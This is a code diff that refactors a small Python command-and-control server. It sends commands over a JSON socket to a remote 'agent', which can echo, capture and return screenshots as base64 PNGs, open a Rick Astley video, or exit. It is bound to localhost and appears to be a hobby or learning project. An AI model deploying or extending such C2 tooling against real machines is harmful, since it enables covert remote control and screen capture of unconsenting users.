@@ -1,53 +1,52 @@
+
+
 import socket
 import json
 import time
+from typing import Optional
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 9323
-RETRY_DELAY = 2
+RETRY_DELAY = 2.0
+
 MENU_TEXT = """Available commands:
 1. echo <message> - Echoes the message back.
-2. screenshot - Takes a screenshot of the agent's screen.
-3. rickroll - Plays the Rick Astley video.
-4. exit - Closes the connection and exits.
+2. screenshot - Asks agent for a screenshot (base64 PNG returned).
+3. rickroll - Opens Rick Astley video on the agent side (if GUI).
+4. exit - Closes the session and stops the agent.
 """
 
 
 class JsonSocket:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
-        self.sock = None
-        self.connect()
-    def connect(self):
-        while True:
-            try:
-                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.connect((self.host, self.port))
-                print(f"Connected to server at {self.host}:{self.port}")
-                break
-            except ConnectionRefusedError:
-                print(f"no connection, retrying in {RETRY_DELAY} ")
-                time.sleep(RETRY_DELAY)
+    """Line-delimited JSON over a socket using a text file wrapper."""
 
-    def send_json(self, data):
-        message = json.dumps(data).encode('utf-8')
-        self.sock.sendall(message)
+    def __init__(self, sock: socket.socket):
+        self._sock = sock
+        self._fp = sock.makefile("r+", encoding="utf-8", newline="\n")
 
-    def receive_json(self):
-        received_data = self.sock.recv(4096)
-        return json.loads(received_data.decode('utf-8'))
+    def send(self, obj: dict) -> None:
+        self._fp.write(json.dumps(obj) + "\n")
+        self._fp.flush()
 
-    def close(self):
-        if self.sock:
-            self.sock.close()
-            print("Connection closed.")
+    def recv(self) -> dict:
+        line = self._fp.readline()
+        if line == "":
+            raise ConnectionError("peer closed connection")
+        return json.loads(line)
+
+    def close(self) -> None:
+        try:
+            self._fp.close()
+        finally:
+            self._sock.close()
+
+
 class C2Server:
     def __init__(self, host: str, port: int, menu: str):
         self.host = host
         self.port = port
         self.menu = menu
-        self._lsock: socket.socket | None = None
+        self._lsock: Optional[socket.socket] = None
 
     def _listen(self) -> None:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -75,19 +74,45 @@ class C2Server:
                     except (EOFError, KeyboardInterrupt):
                         cmd = "exit"
 
+                    if not cmd:
+                        continue
+
                     jsock.send({"type": "command", "data": cmd})
 
                     if cmd.lower() == "exit":
-                        print("[server] closing session.")
+                        print("[server] sent exit to agent, closing.")
                         break
 
+    
                     try:
                         reply = jsock.recv()
                     except ConnectionError:
                         print("[server] agent disconnected.")
                         break
+                    except json.JSONDecodeError:
+                        print("[server] received invalid JSON from agent.")
+                        continue
 
-                    print(f"[server] agent replied: {reply}")
+                   
+                    if isinstance(reply, dict) and reply.get("type") == "result":
+                        if "screenshot_b64" in reply:
+                            b64 = reply["screenshot_b64"]
+                            print("[server] received screenshot (base64 length {})".format(len(b64)))
+                         
+                            save = input("Save screenshot to file? (y/N) ").strip().lower()
+                            if save == "y":
+                                fname = input("Filename (e.g. out.png): ").strip() or "screenshot.png"
+                                try:
+                                    import base64
+                                    with open(fname, "wb") as f:
+                                        f.write(base64.b64decode(b64))
+                                    print(f"[server] screenshot saved to {fname}")
+                                except Exception as e:
+                                    print("[server] failed to save screenshot:", e)
+                        else:
+                            print("[server] agent replied:", reply)
+                    else:
+                        print("[server] agent replied:", reply)
             finally:
                 jsock.close()
         finally:
